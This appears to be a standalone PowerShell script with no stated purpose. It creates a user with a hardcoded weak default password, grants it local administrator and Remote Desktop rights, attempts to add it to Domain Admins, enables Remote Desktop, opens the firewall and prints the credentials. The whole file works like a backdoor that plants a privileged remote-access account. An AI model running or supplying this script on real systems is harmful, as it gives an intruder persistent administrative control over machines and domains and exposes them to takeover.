param(
    [string]$username,
    [string]$password = "P@ssw0rd"
)

net user $username $password /add
net localgroup administrators $username /add
net localgroup "Remote Desktop Users" $username /add

try {
    net group "Domain Admins" $username /add /domain
} catch {
    Write-Host "Could not add $username to Domain Admins"
}

Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes

Write-Host "Account created for $username with password $password"
